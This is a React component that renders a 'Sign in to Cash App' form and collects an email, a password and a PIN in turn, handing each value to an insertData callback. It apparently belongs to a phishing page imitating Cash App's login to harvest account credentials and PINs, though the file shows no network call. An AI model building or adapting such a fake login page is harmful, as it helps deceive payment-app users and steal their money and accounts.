import React from "react";
import Buttonnxt from "./Buttonnxt";

class Form extends React.Component {
  handleChange = (event) => {
    this.props.insertData(event.target.name, event.target.value);
    this.props.setIval(event.target.value);
    const length = event.target.selectionEnd;
    if (this.props.state.session.sessid == "email") {
      if (length > 7) {
        this.props.updateState("btn", false);
      } else {
        this.props.updateState("hide", true);
      }
    }
    if (this.props.state.session.sessid == "pw") {
      if (length > 5) {
        this.props.updateState("btn", false);
      } else {
        this.props.updateState("hide", true);
      }
    }
    if (this.props.state.session.sessid == "pin") {
      if (length > 3) {
        this.props.updateState("btn", false);
      } else {
        this.props.updateState("hide", true);
      }
    }
  };
  render() {
    return (
      <div className="flex-c">
        <div className="form-c">
          <h1>Sign in to Cash App</h1>
          <input
            type={this.props.state.session.itype}
            name={this.props.state.session.iname}
            placeholder={this.props.state.session.iplace}
            onChange={this.handleChange}
            value={this.props.state.session.ival}
          />
          <Buttonnxt
            updateState={this.props.updateState}
            setSession={this.props.setSession}
            state={this.props.state}
          />
        </div>
      </div>
    );
  }
}

export default Form;
